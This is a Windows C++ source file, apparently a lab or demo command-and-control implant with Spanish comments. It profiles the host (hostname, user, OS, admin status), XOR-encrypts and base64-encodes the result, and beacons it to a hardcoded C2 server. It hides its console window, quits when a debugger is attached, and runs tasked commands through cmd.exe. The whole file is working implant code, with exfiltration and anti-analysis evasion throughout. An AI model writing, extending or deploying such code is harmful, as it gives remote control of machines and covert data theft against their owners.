#include <windows.h>
#include <wininet.h>
#include <wincrypt.h>
#include <iostream>
#include <string>
#include <thread>
#include <atomic>
#include <random>
#include <sstream>
#include <iomanip>
#include <vector>

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "advapi32.lib")  // Para funciones de token

// ==================== CONFIGURACIÓN ====================
#define C2_SERVER "192.168.254.137"
#define C2_PORT 8443
#define C2_PATH "/"
#define USER_AGENT "Mozilla/5.0"

// ==================== CIFRADO SIMPLE ====================
std::string xor_encrypt(const std::string& data, const std::string& key) {
    std::string result;
    for (size_t i = 0; i < data.size(); i++) {
        result += data[i] ^ key[i % key.size()];
    }
    return result;
}

std::string base64_encode(const std::string& input) {
    DWORD len = 0;
    CryptBinaryToStringA((BYTE*)input.data(), (DWORD)input.size(),
                        CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, &len);
    
    std::vector<char> buffer(len);
    CryptBinaryToStringA((BYTE*)input.data(), (DWORD)input.size(),
                        CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF,
                        buffer.data(), &len);
    
    return std::string(buffer.data());
}

// ==================== COMUNICACIÓN ====================
class BeaconSender {
private:
    std::string agent_id;
    std::string master_key;
    
    std::string generate_agent_id() {
        char computer_name[MAX_COMPUTERNAME_LENGTH + 1];
        DWORD size = sizeof(computer_name);
        GetComputerNameA(computer_name, &size);
        
        char username[256];
        DWORD username_len = sizeof(username);
        GetUserNameA(username, &username_len);
        
        DWORD serial = 0;
        GetVolumeInformationA("C:\\", NULL, 0, &serial, NULL, NULL, NULL, 0);
        
        std::stringstream ss;
        ss << computer_name << "-" << username << "-" << std::hex << serial;
        return ss.str();
    }
    
    bool is_user_admin() {
        BOOL isElevated = FALSE;
        HANDLE hToken = NULL;
        
        if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
            TOKEN_ELEVATION elevation;
            DWORD dwSize;
            
            if (GetTokenInformation(hToken, TokenElevation, &elevation, 
                                   sizeof(elevation), &dwSize)) {
                isElevated = elevation.TokenIsElevated;
            }
            CloseHandle(hToken);
        }
        
        return isElevated != FALSE;
    }
    
    std::string gather_system_info() {
        std::stringstream info;
        
        // Información básica
        char hostname[256];
        DWORD hostname_len = sizeof(hostname);
        GetComputerNameA(hostname, &hostname_len);
        
        char username[256];
        DWORD username_len = sizeof(username);
        GetUserNameA(username, &username_len);
        
        // OS info
        OSVERSIONINFOEXA osvi;
        ZeroMemory(&osvi, sizeof(OSVERSIONINFOEXA));
        osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEXA);
        GetVersionExA((OSVERSIONINFOA*)&osvi);
        
        // Arquitectura
        SYSTEM_INFO sys_info;
        GetNativeSystemInfo(&sys_info);
        
        // **CÓDIGO CORREGIDO - SIN ERRORES DE SINTAXIS**
        info << "{";
        info << "\"agent_id\":\"" << agent_id << "\",";
        info << "\"hostname\":\"" << hostname << "\",";
        info << "\"username\":\"" << username << "\",";
        info << "\"os_version\":\"Windows " << osvi.dwMajorVersion 
             << "." << osvi.dwMinorVersion << "\",";
        info << "\"architecture\":\"" 
             << (sys_info.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64 ? "x64" : "x86") 
             << "\",";
        info << "\"integrity\":\"" << (is_user_admin() ? "high" : "medium") << "\"";
        info << "}";
        
        return info.str();
    }
    
    std::string http_post(const std::string& data) {
        HINTERNET hInternet = InternetOpenA(USER_AGENT,
                                          INTERNET_OPEN_TYPE_PRECONFIG,
                                          NULL, NULL, 0);
        if (!hInternet) return "";
        
        HINTERNET hConnect = InternetConnectA(hInternet, C2_SERVER, C2_PORT,
                                            NULL, NULL, INTERNET_SERVICE_HTTP,
                                            0, 0);
        if (!hConnect) {
            InternetCloseHandle(hInternet);
            return "";
        }
        
        HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", C2_PATH,
                                            NULL, NULL, NULL,
                                            INTERNET_FLAG_RELOAD |
                                            INTERNET_FLAG_NO_CACHE_WRITE, 0);
        if (!hRequest) {
            InternetCloseHandle(hConnect);
            InternetCloseHandle(hInternet);
            return "";
        }
        
        // Cifrar datos
        std::string encrypted = xor_encrypt(data, master_key);
        std::string b64_data = base64_encode(encrypted);
        
        std::string headers = "Content-Type: application/octet-stream\r\n";
        
        if (HttpSendRequestA(hRequest, headers.c_str(), (DWORD)headers.length(),
                            (LPVOID)b64_data.c_str(), (DWORD)b64_data.length())) {
            
            // Leer respuesta
            std::string response;
            char buffer[4096];
            DWORD bytes_read = 0;
            
            while (InternetReadFile(hRequest, buffer, sizeof(buffer),
                                   &bytes_read) && bytes_read > 0) {
                response.append(buffer, bytes_read);
            }
            
            InternetCloseHandle(hRequest);
            InternetCloseHandle(hConnect);
            InternetCloseHandle(hInternet);
            
            // Procesar respuesta
            if (!response.empty()) {
                // Decodificar base64
                DWORD decoded_len = 0;
                CryptStringToBinaryA(response.c_str(), (DWORD)response.length(),
                                    CRYPT_STRING_BASE64, NULL, &decoded_len,
                                    NULL, NULL);
                
                std::vector<BYTE> decoded(decoded_len);
                CryptStringToBinaryA(response.c_str(), (DWORD)response.length(),
                                    CRYPT_STRING_BASE64, decoded.data(),
                                    &decoded_len, NULL, NULL);
                
                std::string encrypted_resp(decoded.begin(), decoded.end());
                return xor_encrypt(encrypted_resp, master_key);
            }
        }
        
        InternetCloseHandle(hRequest);
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        
        return "";
    }
    
public:
    BeaconSender() : master_key("DemoKey123!@#") {
        agent_id = generate_agent_id();
    }
    
    std::string send_beacon() {
        std::string beacon_data = gather_system_info();
        std::cout << "[DEBUG] Datos: " << beacon_data << std::endl;
        
        std::string response = http_post(beacon_data);
        
        if (!response.empty()) {
            return response;
        }
        
        return "";
    }
    
    DWORD calculate_sleep_time() {
        static std::random_device rd;
        static std::mt19937 gen(rd());
        std::uniform_int_distribution<> dis(5, 10);
        return dis(gen) * 1000;
    }
};

// ==================== EJECUTOR DE TAREAS ====================
class TaskExecutor {
public:
    std::string execute_command(const std::string& command) {
        SECURITY_ATTRIBUTES sa;
        sa.nLength = sizeof(sa);
        sa.lpSecurityDescriptor = NULL;
        sa.bInheritHandle = TRUE;
        
        HANDLE hStdoutRd, hStdoutWr;
        CreatePipe(&hStdoutRd, &hStdoutWr, &sa, 0);
        SetHandleInformation(hStdoutRd, HANDLE_FLAG_INHERIT, 0);
        
        STARTUPINFOA si;
        PROCESS_INFORMATION pi;
        
        ZeroMemory(&si, sizeof(si));
        si.cb = sizeof(si);
        si.hStdError = hStdoutWr;
        si.hStdOutput = hStdoutWr;
        si.dwFlags |= STARTF_USESTDHANDLES;
        
        ZeroMemory(&pi, sizeof(pi));
        
        std::string cmd = "cmd.exe /c " + command;
        
        if (CreateProcessA(NULL, (LPSTR)cmd.c_str(), NULL, NULL, TRUE,
                          CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
            CloseHandle(hStdoutWr);
            
            WaitForSingleObject(pi.hProcess, 5000);
            
            std::string output;
            DWORD dwRead;
            CHAR buffer[4096];
            
            while (ReadFile(hStdoutRd, buffer, sizeof(buffer), &dwRead, NULL) && dwRead > 0) {
                output.append(buffer, dwRead);
            }
            
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            CloseHandle(hStdoutRd);
            
            return output;
        }
        
        CloseHandle(hStdoutRd);
        CloseHandle(hStdoutWr);
        return "Error executing command";
    }
};

// ==================== AGENTE PRINCIPAL ====================
class WorkingAgent {
private:
    BeaconSender beacon;
    TaskExecutor executor;
    std::atomic<bool> running;
    std::thread beacon_thread;
    
    void beacon_loop() {
        while (running) {
            std::string response = beacon.send_beacon();
            
            if (!response.empty()) {
                if (response.find("tasks") != std::string::npos) {
                    std::string result = executor.execute_command("whoami");
                    std::cout << "[+] Resultado: " << result << std::endl;
                }
            }
            
            Sleep(beacon.calculate_sleep_time());
        }
    }
    
public:
    WorkingAgent() : running(false) {
        if (IsDebuggerPresent()) {
            exit(0);
        }
    }
    
    ~WorkingAgent() {
        stop();
    }
    
    void start() {
        running = true;
        beacon_thread = std::thread(&WorkingAgent::beacon_loop, this);
    }
    
    void stop() {
        running = false;
        if (beacon_thread.joinable()) {
            beacon_thread.join();
        }
    }
    
    void run() {
        start();
        beacon_thread.join();
    }
};

// ==================== ENTRY POINT ====================
int main() {
    #ifndef _DEBUG
    HWND hwnd = GetConsoleWindow();
    if (hwnd) ShowWindow(hwnd, SW_HIDE);
    #endif
    
    std::cout << "=== Agente Demo Iniciado ===\n" << std::endl;
    
    try {
        WorkingAgent agent;
        agent.run();
    }
    catch (...) {
        return 1;
    }
    
    return 0;
}
